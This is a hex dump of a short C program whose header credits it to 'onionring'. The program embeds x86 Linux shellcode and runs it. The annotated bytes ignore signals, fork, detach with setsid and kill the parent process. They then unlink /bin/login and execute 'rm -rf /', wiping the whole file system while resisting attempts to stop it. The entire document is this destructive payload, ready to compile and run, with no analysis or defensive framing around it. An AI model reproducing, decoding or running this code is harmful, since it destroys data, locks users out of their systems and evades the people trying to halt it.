00000000  2f 2a 0d 0a 78 38 36 20  6c 69 6e 75 78 20 72 6d  |/*..x86 linux rm|
00000010  20 2d 72 66 20 2f 20 77  68 69 63 68 20 61 74 74  | -rf / which att|
00000020  65 6d 70 74 73 20 74 6f  20 62 6c 6f 63 6b 20 74  |empts to block t|
00000030  68 65 20 70 72 6f 63 65  73 73 20 66 72 6f 6d 20  |he process from |
00000040  62 65 69 6e 67 20 73 74  6f 70 70 65 64 0d 0a 31  |being stopped..1|
00000050  33 32 20 62 79 74 65 73  0d 0a 77 72 69 74 74 65  |32 bytes..writte|
00000060  6e 20 62 79 20 6f 6e 69  6f 6e 72 69 6e 67 0d 0a  |n by onionring..|
00000070  2a 2f 0d 0a 0d 0a 6d 61  69 6e 28 29 0d 0a 7b 0d  |*/....main()..{.|
00000080  0a 20 63 68 61 72 20 73  68 65 6c 6c 63 6f 64 65  |. char shellcode|
00000090  5b 5d 20 3d 0d 0a 22 5c  78 33 31 5c 78 43 30 22  |[] =.."\x31\xC0"|
000000a0  20 20 20 20 20 20 20 20  20 20 20 20 20 20 2f 2f  |              //|
000000b0  20 78 6f 72 20 65 61 78  2c 20 65 61 78 0d 0a 22  | xor eax, eax.."|
000000c0  5c 78 38 39 5c 78 43 33  22 20 20 20 20 20 20 20  |\x89\xC3"       |
000000d0  20 20 20 20 20 20 20 2f  2f 20 6d 6f 76 20 65 62  |       // mov eb|
000000e0  78 2c 20 65 61 78 0d 0a  22 5c 78 38 39 5c 78 43  |x, eax.."\x89\xC|
000000f0  31 22 20 20 20 20 20 20  20 20 20 20 20 20 20 20  |1"              |
00000100  2f 2f 20 6d 6f 76 20 65  63 78 2c 20 65 61 78 0d  |// mov ecx, eax.|
00000110  0a 22 5c 78 34 31 22 20  20 20 20 20 20 20 20 20  |."\x41"         |
00000120  20 20 20 20 20 20 20 20  20 2f 2f 20 69 6e 63 20  |         // inc |
00000130  65 63 78 0d 0a 22 5c 78  42 30 5c 78 33 30 22 20  |ecx.."\xB0\x30" |
00000140  20 20 20 20 20 20 20 20  20 20 20 20 20 2f 2f 20  |             // |
00000150  6d 6f 76 20 61 6c 2c 20  30 78 33 30 20 3b 20 73  |mov al, 0x30 ; s|
00000160  79 73 5f 73 69 67 6e 61  6c 0d 0a 22 5c 78 43 44  |ys_signal.."\xCD|
00000170  5c 78 38 30 22 20 20 20  20 20 20 20 20 20 20 20  |\x80"           |
00000180  20 20 20 2f 2f 20 69 6e  74 20 30 78 38 30 0d 0a  |   // int 0x80..|
00000190  22 5c 78 33 31 5c 78 43  30 22 20 20 20 20 20 20  |"\x31\xC0"      |
000001a0  20 20 20 20 20 20 20 20  2f 2f 20 78 6f 72 20 65  |        // xor e|
000001b0  61 78 2c 20 65 61 78 0d  0a 22 5c 78 46 45 5c 78  |ax, eax.."\xFE\x|
000001c0  43 33 22 20 20 20 20 20  20 20 20 20 20 20 20 20  |C3"             |
000001d0  20 2f 2f 20 69 6e 63 20  62 6c 0d 0a 22 5c 78 38  | // inc bl.."\x8|
000001e0  30 5c 78 46 42 5c 78 31  46 22 20 20 20 20 20 20  |0\xFB\x1F"      |
000001f0  20 20 20 20 2f 2f 20 63  6d 70 20 62 6c 2c 20 30  |    // cmp bl, 0|
00000200  78 31 66 0d 0a 22 5c 78  37 32 5c 78 46 33 22 20  |x1f.."\x72\xF3" |
00000210  20 20 20 20 20 20 20 20  20 20 20 20 20 2f 2f 20  |             // |
00000220  6a 62 20 30 78 66 33 0d  0a 22 5c 78 30 34 5c 78  |jb 0xf3.."\x04\x|
00000230  34 30 22 20 20 20 20 20  20 20 20 20 20 20 20 20  |40"             |
00000240  20 2f 2f 20 61 64 64 20  61 6c 2c 20 30 78 34 30  | // add al, 0x40|
00000250  20 3b 20 73 79 73 5f 67  65 74 70 70 69 64 0d 0a  | ; sys_getppid..|
00000260  22 5c 78 43 44 5c 78 38  30 22 20 20 20 20 20 20  |"\xCD\x80"      |
00000270  20 20 20 20 20 20 20 20  2f 2f 20 69 6e 74 20 30  |        // int 0|
00000280  78 38 30 0d 0a 22 5c 78  38 39 5c 78 43 32 22 20  |x80.."\x89\xC2" |
00000290  20 20 20 20 20 20 20 20  20 20 20 20 20 2f 2f 20  |             // |
000002a0  6d 6f 76 20 65 64 78 2c  20 65 61 78 0d 0a 22 5c  |mov edx, eax.."\|
000002b0  78 33 31 5c 78 43 30 22  20 20 20 20 20 20 20 20  |x31\xC0"        |
000002c0  20 20 20 20 20 20 2f 2f  20 78 6f 72 20 65 61 78  |      // xor eax|
000002d0  2c 20 65 61 78 0d 0a 22  5c 78 42 30 5c 78 30 32  |, eax.."\xB0\x02|
000002e0  22 20 20 20 20 20 20 20  20 20 20 20 20 20 20 2f  |"              /|
000002f0  2f 20 6d 6f 76 20 61 6c  2c 20 30 78 32 20 3b 20  |/ mov al, 0x2 ; |
00000300  73 79 73 5f 66 6f 72 6b  0d 0a 22 5c 78 43 44 5c  |sys_fork.."\xCD\|
00000310  78 38 30 22 20 20 20 20  20 20 20 20 20 20 20 20  |x80"            |
00000320  20 20 2f 2f 20 69 6e 74  20 30 78 38 30 0d 0a 22  |  // int 0x80.."|
00000330  5c 78 33 39 5c 78 43 30  22 20 20 20 20 20 20 20  |\x39\xC0"       |
00000340  20 20 20 20 20 20 20 2f  2f 20 63 6d 70 20 65 61  |       // cmp ea|
00000350  78 2c 20 65 61 78 0d 0a  22 5c 78 37 34 5c 78 30  |x, eax.."\x74\x0|
00000360  38 22 20 20 20 20 20 20  20 20 20 20 20 20 20 20  |8"              |
00000370  2f 2f 20 6a 6e 7a 20 30  78 38 0d 0a 22 5c 78 33  |// jnz 0x8.."\x3|
00000380  31 5c 78 43 30 22 20 20  20 20 20 20 20 20 20 20  |1\xC0"          |
00000390  20 20 20 20 2f 2f 20 78  6f 72 20 65 61 78 2c 20  |    // xor eax, |
000003a0  65 61 78 0d 0a 22 5c 78  38 39 5c 78 43 33 22 20  |eax.."\x89\xC3" |
000003b0  20 20 20 20 20 20 20 20  20 20 20 20 20 2f 2f 20  |             // |
000003c0  6d 6f 76 20 65 62 78 2c  20 65 61 78 0d 0a 22 5c  |mov ebx, eax.."\|
000003d0  78 42 30 5c 78 30 31 22  20 20 20 20 20 20 20 20  |xB0\x01"        |
000003e0  20 20 20 20 20 20 2f 2f  20 6d 6f 76 20 61 6c 2c  |      // mov al,|
000003f0  20 30 78 31 20 3b 20 73  79 73 5f 65 78 69 74 0d  | 0x1 ; sys_exit.|
00000400  0a 22 5c 78 43 44 5c 78  38 30 22 20 20 20 20 20  |."\xCD\x80"     |
00000410  20 20 20 20 20 20 20 20  20 2f 2f 20 69 6e 74 20  |         // int |
00000420  30 78 38 30 0d 0a 22 5c  78 33 31 5c 78 43 30 22  |0x80.."\x31\xC0"|
00000430  20 20 20 20 20 20 20 20  20 20 20 20 20 20 2f 2f  |              //|
00000440  20 78 6f 72 20 65 61 78  2c 20 65 61 78 0d 0a 22  | xor eax, eax.."|
00000450  5c 78 42 30 5c 78 34 32  22 20 20 20 20 20 20 20  |\xB0\x42"       |
00000460  20 20 20 20 20 20 20 2f  2f 20 6d 6f 76 20 61 6c  |       // mov al|
00000470  2c 20 30 78 34 32 20 3b  20 73 79 73 5f 73 65 74  |, 0x42 ; sys_set|
00000480  73 69 64 0d 0a 22 5c 78  43 44 5c 78 38 30 22 20  |sid.."\xCD\x80" |
00000490  20 20 20 20 20 20 20 20  20 20 20 20 20 2f 2f 20  |             // |
000004a0  69 6e 74 20 30 78 38 30  0d 0a 22 5c 78 34 33 22  |int 0x80.."\x43"|
000004b0  20 20 20 20 20 20 20 20  20 20 20 20 20 20 20 20  |                |
000004c0  20 20 2f 2f 20 69 6e 63  20 65 62 78 0d 0a 22 5c  |  // inc ebx.."\|
000004d0  78 33 39 5c 78 44 41 22  20 20 20 20 20 20 20 20  |x39\xDA"        |
000004e0  20 20 20 20 20 20 2f 2f  20 63 6d 70 20 65 64 78  |      // cmp edx|
000004f0  2c 20 65 62 78 0d 0a 22  5c 78 37 34 5c 78 30 38  |, ebx.."\x74\x08|
00000500  22 20 20 20 20 20 20 20  20 20 20 20 20 20 20 2f  |"              /|
00000510  2f 20 6a 7a 20 30 78 38  0d 0a 22 5c 78 38 39 5c  |/ jz 0x8.."\x89\|
00000520  78 44 33 22 20 20 20 20  20 20 20 20 20 20 20 20  |xD3"            |
00000530  20 20 2f 2f 20 6d 6f 76  20 65 62 78 2c 20 65 64  |  // mov ebx, ed|
00000540  78 0d 0a 22 5c 78 33 31  5c 78 43 30 22 20 20 20  |x.."\x31\xC0"   |
00000550  20 20 20 20 20 20 20 20  20 20 20 2f 2f 20 78 6f  |           // xo|
00000560  72 20 65 61 78 2c 20 65  61 78 0d 0a 22 5c 78 30  |r eax, eax.."\x0|
00000570  34 5c 78 32 35 22 20 20  20 20 20 20 20 20 20 20  |4\x25"          |
00000580  20 20 20 20 2f 2f 20 61  64 64 20 61 6c 2c 20 30  |    // add al, 0|
00000590  78 32 35 20 3b 20 73 79  73 5f 6b 69 6c 6c 0d 0a  |x25 ; sys_kill..|
000005a0  22 5c 78 43 44 5c 78 38  30 22 20 20 20 20 20 20  |"\xCD\x80"      |
000005b0  20 20 20 20 20 20 20 20  2f 2f 20 69 6e 74 20 30  |        // int 0|
000005c0  78 38 30 0d 0a 22 5c 78  33 31 5c 78 43 30 22 20  |x80.."\x31\xC0" |
000005d0  20 20 20 20 20 20 20 20  20 20 20 20 20 2f 2f 20  |             // |
000005e0  78 6f 72 20 65 61 78 2c  20 65 61 78 0d 0a 22 5c  |xor eax, eax.."\|
000005f0  78 35 30 22 20 20 20 20  20 20 20 20 20 20 20 20  |x50"            |
00000600  20 20 20 20 20 20 2f 2f  20 70 75 73 68 20 65 61  |      // push ea|
00000610  78 0d 0a 22 5c 78 36 38  5c 78 36 46 5c 78 36 37  |x.."\x68\x6F\x67|
00000620  5c 78 36 39 5c 78 36 45  22 20 20 2f 2f 20 70 75  |\x69\x6E"  // pu|
00000630  73 68 20 22 6f 67 69 6e  22 0d 0a 22 5c 78 36 38  |sh "ogin".."\x68|
00000640  5c 78 36 39 5c 78 36 45  5c 78 32 46 5c 78 36 43  |\x69\x6E\x2F\x6C|
00000650  22 20 20 2f 2f 20 70 75  73 68 20 22 69 6e 2f 6c  |"  // push "in/l|
00000660  22 0d 0a 22 5c 78 36 38  5c 78 32 46 5c 78 32 46  |".."\x68\x2F\x2F|
00000670  5c 78 32 46 5c 78 36 32  22 20 20 2f 2f 20 70 75  |\x2F\x62"  // pu|
00000680  73 68 20 22 2f 2f 2f 62  22 0d 0a 22 5c 78 38 39  |sh "///b".."\x89|
00000690  5c 78 45 33 22 20 20 20  20 20 20 20 20 20 20 20  |\xE3"           |
000006a0  20 20 20 2f 2f 20 6d 6f  76 20 65 62 78 2c 20 65  |   // mov ebx, e|
000006b0  73 70 0d 0a 22 5c 78 33  31 5c 78 43 30 22 20 20  |sp.."\x31\xC0"  |
000006c0  20 20 20 20 20 20 20 20  20 20 20 20 2f 2f 20 78  |            // x|
000006d0  6f 72 20 65 61 78 2c 20  65 61 78 0d 0a 22 5c 78  |or eax, eax.."\x|
000006e0  30 34 5c 78 30 41 22 20  20 20 20 20 20 20 20 20  |04\x0A"         |
000006f0  20 20 20 20 20 2f 2f 20  61 64 64 20 61 6c 2c 20  |     // add al, |
00000700  30 78 61 20 3b 20 73 79  73 5f 75 6e 6c 69 6e 6b  |0xa ; sys_unlink|
00000710  0d 0a 22 5c 78 43 44 5c  78 38 30 22 20 20 20 20  |.."\xCD\x80"    |
00000720  20 20 20 20 20 20 20 20  20 20 2f 2f 20 69 6e 74  |          // int|
00000730  20 30 78 38 30 0d 0a 22  5c 78 33 31 5c 78 43 30  | 0x80.."\x31\xC0|
00000740  22 20 20 20 20 20 20 20  20 20 20 20 20 20 20 2f  |"              /|
00000750  2f 20 78 6f 72 20 65 61  78 2c 20 65 61 78 0d 0a  |/ xor eax, eax..|
00000760  22 5c 78 35 30 22 20 20  20 20 20 20 20 20 20 20  |"\x50"          |
00000770  20 20 20 20 20 20 20 20  2f 2f 20 70 75 73 68 20  |        // push |
00000780  65 61 78 0d 0a 22 5c 78  36 38 5c 78 32 46 5c 78  |eax.."\x68\x2F\x|
00000790  32 46 5c 78 32 46 5c 78  32 46 22 20 20 2f 2f 20  |2F\x2F\x2F"  // |
000007a0  70 75 73 68 20 22 2f 2f  2f 2f 22 0d 0a 22 5c 78  |push "////".."\x|
000007b0  38 39 5c 78 45 32 22 20  20 20 20 20 20 20 20 20  |89\xE2"         |
000007c0  20 20 20 20 20 2f 2f 20  6d 6f 76 20 65 64 78 2c  |     // mov edx,|
000007d0  20 65 73 70 0d 0a 22 5c  78 35 30 22 20 20 20 20  | esp.."\x50"    |
000007e0  20 20 20 20 20 20 20 20  20 20 20 20 20 20 2f 2f  |              //|
000007f0  20 70 75 73 68 20 65 61  78 0d 0a 22 5c 78 36 38  | push eax.."\x68|
00000800  5c 78 32 44 5c 78 37 32  5c 78 36 36 5c 78 36 36  |\x2D\x72\x66\x66|
00000810  22 20 20 2f 2f 20 70 75  73 68 20 22 2d 72 66 66  |"  // push "-rff|
00000820  22 0d 0a 22 5c 78 38 39  5c 78 45 31 22 20 20 20  |".."\x89\xE1"   |
00000830  20 20 20 20 20 20 20 20  20 20 20 2f 2f 20 6d 6f  |           // mo|
00000840  76 20 65 63 78 2c 20 65  73 70 0d 0a 22 5c 78 35  |v ecx, esp.."\x5|
00000850  30 22 20 20 20 20 20 20  20 20 20 20 20 20 20 20  |0"              |
00000860  20 20 20 20 2f 2f 20 70  75 73 68 20 65 61 78 0d  |    // push eax.|
00000870  0a 22 5c 78 36 38 5c 78  36 45 5c 78 32 46 5c 78  |."\x68\x6E\x2F\x|
00000880  37 32 5c 78 36 44 22 20  20 2f 2f 20 70 75 73 68  |72\x6D"  // push|
00000890  20 22 6e 2f 72 6d 22 0d  0a 22 5c 78 36 38 5c 78  | "n/rm".."\x68\x|
000008a0  32 46 5c 78 32 46 5c 78  36 32 5c 78 36 39 22 20  |2F\x2F\x62\x69" |
000008b0  20 2f 2f 20 70 75 73 68  20 22 2f 2f 62 69 22 0d  | // push "//bi".|
000008c0  0a 22 5c 78 38 39 5c 78  45 33 22 20 20 20 20 20  |."\x89\xE3"     |
000008d0  20 20 20 20 20 20 20 20  20 2f 2f 20 6d 6f 76 20  |         // mov |
000008e0  65 62 78 2c 20 65 73 70  0d 0a 22 5c 78 35 30 22  |ebx, esp.."\x50"|
000008f0  20 20 20 20 20 20 20 20  20 20 20 20 20 20 20 20  |                |
00000900  20 20 2f 2f 20 70 75 73  68 20 65 61 78 0d 0a 22  |  // push eax.."|
00000910  5c 78 35 32 22 20 20 20  20 20 20 20 20 20 20 20  |\x52"           |
00000920  20 20 20 20 20 20 20 2f  2f 20 70 75 73 68 20 65  |       // push e|
00000930  64 78 0d 0a 22 5c 78 35  31 22 20 20 20 20 20 20  |dx.."\x51"      |
00000940  20 20 20 20 20 20 20 20  20 20 20 20 2f 2f 20 70  |            // p|
00000950  75 73 68 20 65 63 78 0d  0a 22 5c 78 35 33 22 20  |ush ecx.."\x53" |
00000960  20 20 20 20 20 20 20 20  20 20 20 20 20 20 20 20  |                |
00000970  20 2f 2f 20 70 75 73 68  20 65 62 78 0d 0a 22 5c  | // push ebx.."\|
00000980  78 38 39 5c 78 45 31 22  20 20 20 20 20 20 20 20  |x89\xE1"        |
00000990  20 20 20 20 20 20 2f 2f  20 6d 6f 76 20 65 63 78  |      // mov ecx|
000009a0  2c 20 65 73 70 0d 0a 22  5c 78 33 31 5c 78 44 32  |, esp.."\x31\xD2|
000009b0  22 20 20 20 20 20 20 20  20 20 20 20 20 20 20 2f  |"              /|
000009c0  2f 20 78 6f 72 20 65 64  78 2c 20 65 64 78 0d 0a  |/ xor edx, edx..|
000009d0  22 5c 78 30 34 5c 78 30  42 22 20 20 20 20 20 20  |"\x04\x0B"      |
000009e0  20 20 20 20 20 20 20 20  2f 2f 20 61 64 64 20 61  |        // add a|
000009f0  6c 2c 20 30 78 62 20 3b  20 73 79 73 5f 65 78 65  |l, 0xb ; sys_exe|
00000a00  63 76 65 0d 0a 22 5c 78  43 44 5c 78 38 30 22 3b  |cve.."\xCD\x80";|
00000a10  20 20 20 20 20 20 20 20  20 20 20 20 20 2f 2f 20  |             // |
00000a20  69 6e 74 20 30 78 38 30  0d 0a 0d 0a 20 28 2a 28  |int 0x80.... (*(|
00000a30  76 6f 69 64 20 28 2a 29  28 29 29 20 73 68 65 6c  |void (*)()) shel|
00000a40  6c 63 6f 64 65 29 28 29  3b 0d 0a 7d              |lcode)();..}|
00000a4c
